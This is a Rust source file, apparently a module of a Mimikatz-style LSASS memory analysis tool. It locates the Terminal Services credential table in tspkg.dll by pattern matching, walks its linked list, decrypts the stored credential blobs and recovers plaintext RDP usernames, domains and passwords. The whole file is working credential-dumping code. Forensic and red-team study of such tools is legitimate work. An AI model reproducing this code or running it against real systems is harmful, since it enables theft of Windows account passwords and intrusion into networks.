use crate::error::Result;
use crate::lsass::crypto::CryptoKeys;
use crate::lsass::patterns;
use crate::lsass::types::TspkgCredential;
use crate::memory::VirtualMemory;
use crate::pe::parser::PeHeaders;

/// TsPkg pTsPrimary offset per Windows version (x64).
/// TSGlobalCredTable is a PVOID* (pointer to the first linked list entry).
/// When NULL, no TsPkg credentials exist (common for non-RDP sessions).
const TSPKG_PTS_PRIMARY_OFFSETS: &[u64] = &[
    0x90, // Win10 1507+ / Win11
    0x80, // Win8.1
    0x70, // Win8
    0x40, // Win7 SP1
];

/// Extract TsPkg credentials from tspkg.dll.
///
/// TsPkg stores credentials for Terminal Services (RDP) sessions.
/// On local console logons, TSGlobalCredTable is typically NULL.
pub fn extract_tspkg_credentials(
    vmem: &impl VirtualMemory,
    tspkg_base: u64,
    _tspkg_size: u32,
    keys: &CryptoKeys,
) -> Result<Vec<(u64, TspkgCredential)>> {
    let pe = PeHeaders::parse_from_memory(vmem, tspkg_base)?;
    let mut results = Vec::new();

    let text = match pe.find_section(".text") {
        Some(s) => s,
        None => return Ok(results),
    };

    let text_base = tspkg_base + text.virtual_address as u64;

    let (pattern_addr, _) = match patterns::find_pattern(
        vmem,
        text_base,
        text.virtual_size,
        patterns::TSPKG_LOGON_SESSION_PATTERNS,
        "TSGlobalCredTable",
    ) {
        Ok(r) => r,
        Err(e) => {
            log::info!("Could not find TsPkg pattern: {}", e);
            return Ok(results);
        }
    };

    // The pattern "48 83 EC 20 48 8D 0D" matches:
    //   sub rsp, 0x20
    //   lea rcx, [rip+disp]  -> critical section (first arg to EnterCriticalSection)
    //
    // The first LEA in this function points to a critical section lock, NOT TSGlobalCredTable.
    // We need to find a LEA that dereferences to a valid pointer (the actual table pointer).
    // Scan all LEA instructions in the function and pick the one pointing to a non-null PVOID.
    let table_addr = find_table_from_leas(vmem, pattern_addr)?;
    log::info!("TsPkg TSGlobalCredTable at 0x{:x}", table_addr);

    // TSGlobalCredTable is a PVOID - dereference to get the first list entry.
    let list_head = vmem.read_virt_u64(table_addr)?;
    if list_head == 0 {
        log::info!("TsPkg: TSGlobalCredTable is NULL (no RDP/TS credentials)");
        return Ok(results);
    }
    if list_head < 0x10000 || (list_head >> 48) != 0 {
        log::info!(
            "TsPkg: TSGlobalCredTable has invalid pointer: 0x{:x}",
            list_head
        );
        return Ok(results);
    }

    log::info!("TsPkg: walking credential list from 0x{:x}", list_head);

    // Walk the linked list. The list head entry (pointed to by TSGlobalCredTable)
    // has Flink/Blink at +0x00. Each entry also has Flink/Blink at +0x00.
    // The list terminates when Flink points back to the first entry.
    let mut current = list_head;
    let mut visited = std::collections::HashSet::new();

    loop {
        if visited.contains(&current) || current == 0 {
            break;
        }
        visited.insert(current);

        // Try each pTsPrimary offset variant
        let pts_primary = detect_tspkg_primary_ptr(vmem, current);
        if pts_primary != 0 {
            if let Some(cred) = extract_primary_credential(vmem, keys, pts_primary) {
                log::info!("TsPkg: user={} domain={}", cred.username, cred.domain);
                // LUID is not directly accessible from this structure in a reliable way,
                // so we use 0 and let finder.rs merge by username/domain
                results.push((0, cred));
            }
        }

        current = match vmem.read_virt_u64(current) {
            Ok(f) if f > 0x10000 && (f >> 48) == 0 => f,
            _ => break,
        };
    }

    Ok(results)
}

/// Auto-detect the pTsPrimary offset by trying each variant on the entry.
fn detect_tspkg_primary_ptr(vmem: &impl VirtualMemory, entry: u64) -> u64 {
    for &offset in TSPKG_PTS_PRIMARY_OFFSETS {
        let ptr = match vmem.read_virt_u64(entry + offset) {
            Ok(p) => p,
            Err(_) => continue,
        };
        if ptr > 0x10000 && (ptr >> 48) == 0 {
            // Validate: the pointed-to structure should have a UNICODE_STRING (Credentials)
            // with reasonable Length and MaximumLength
            let len = vmem.read_virt_u16(ptr).unwrap_or(0) as usize;
            let max_len = vmem.read_virt_u16(ptr + 2).unwrap_or(0) as usize;
            if len > 0 && len <= 0x400 && max_len >= len {
                return ptr;
            }
        }
    }
    0
}

/// Find TSGlobalCredTable address by scanning LEA instructions near the pattern.
///
/// The pattern matches a function prologue. We scan forward for LEA reg, [rip+disp]
/// instructions and find the one that dereferences to a valid heap pointer (the table).
/// If none have a non-null value, fall back to the first LEA (original behavior).
fn find_table_from_leas(vmem: &impl VirtualMemory, pattern_addr: u64) -> Result<u64> {
    let code = vmem.read_virt_bytes(pattern_addr, 0x80)?;
    let mut first_target = None;

    for i in 0..code.len().saturating_sub(7) {
        let is_lea = (code[i] == 0x48 || code[i] == 0x4C)
            && code[i + 1] == 0x8D
            && matches!(code[i + 2], 0x05 | 0x0D | 0x15);
        if !is_lea {
            continue;
        }

        let disp = i32::from_le_bytes([code[i + 3], code[i + 4], code[i + 5], code[i + 6]]);
        let rip_after = pattern_addr + i as u64 + 7;
        let target = (rip_after as i64 + disp as i64) as u64;

        if first_target.is_none() {
            first_target = Some(target);
        }

        // Check if this target holds a valid heap pointer (TSGlobalCredTable is PVOID)
        if let Ok(val) = vmem.read_virt_u64(target) {
            if val > 0x10000 && (val >> 48) == 0 {
                // Verify: the pointed-to structure should have Flink/Blink
                if let Ok(flink) = vmem.read_virt_u64(val) {
                    if flink > 0x10000 && (flink >> 48) == 0 {
                        log::debug!("TsPkg: found table via LEA at pattern+0x{:02x} -> 0x{:x} (deref=0x{:x})", i, target, val);
                        return Ok(target);
                    }
                }
            }
        }
    }

    // No LEA target had a valid pointer - use the first one (table may be NULL)
    first_target.ok_or_else(|| {
        crate::error::GovmemError::PatternNotFound(
            "No LEA instruction found near TsPkg pattern".to_string(),
        )
    })
}

/// Extract credentials from a KIWI_TS_PRIMARY_CREDENTIAL structure.
///
/// The structure has a single UNICODE_STRING `Credentials` at +0x00 which is an
/// encrypted blob. After decryption, the blob contains embedded UNICODE_STRINGs:
///   +0x00: UserName
///   +0x10: DomainName
///   +0x20: Password
/// Buffer pointers within these UNICODE_STRINGs are offsets into the blob itself.
fn extract_primary_credential(
    vmem: &impl VirtualMemory,
    keys: &CryptoKeys,
    pts_primary: u64,
) -> Option<TspkgCredential> {
    // Read Credentials UNICODE_STRING at +0x00
    let enc_len = vmem.read_virt_u16(pts_primary).ok()? as usize;
    let enc_max = vmem.read_virt_u16(pts_primary + 2).ok()? as usize;
    let enc_buf = vmem.read_virt_u64(pts_primary + 8).ok()?;

    if enc_len == 0 || enc_len > 0x400 || enc_max < enc_len {
        return None;
    }
    if enc_buf < 0x10000 || (enc_buf >> 48) != 0 {
        return None;
    }

    let enc_data = vmem.read_virt_bytes(enc_buf, enc_len).ok()?;
    let decrypted = crate::lsass::crypto::decrypt_credential(keys, &enc_data).ok()?;

    if decrypted.len() < 0x30 {
        return None;
    }

    let username = read_blob_ustring(&decrypted, 0x00);
    let domain = read_blob_ustring(&decrypted, 0x10);
    let password = read_blob_ustring(&decrypted, 0x20);

    if username.is_empty() {
        return None;
    }

    Some(TspkgCredential {
        username,
        domain,
        password,
    })
}

/// Read a UNICODE_STRING embedded in a decrypted credential blob.
/// The Buffer field is an offset (not a VA) into the blob.
fn read_blob_ustring(blob: &[u8], offset: usize) -> String {
    if offset + 0x10 > blob.len() {
        return String::new();
    }
    let len = u16::from_le_bytes([blob[offset], blob[offset + 1]]) as usize;
    if len == 0 || len > 0x200 {
        return String::new();
    }
    let buf_off =
        u64::from_le_bytes(blob[offset + 8..offset + 16].try_into().unwrap_or([0; 8])) as usize;
    if buf_off + len > blob.len() {
        return String::new();
    }
    let data = &blob[buf_off..buf_off + len];
    crate::lsass::crypto::decode_utf16_le(data)
}
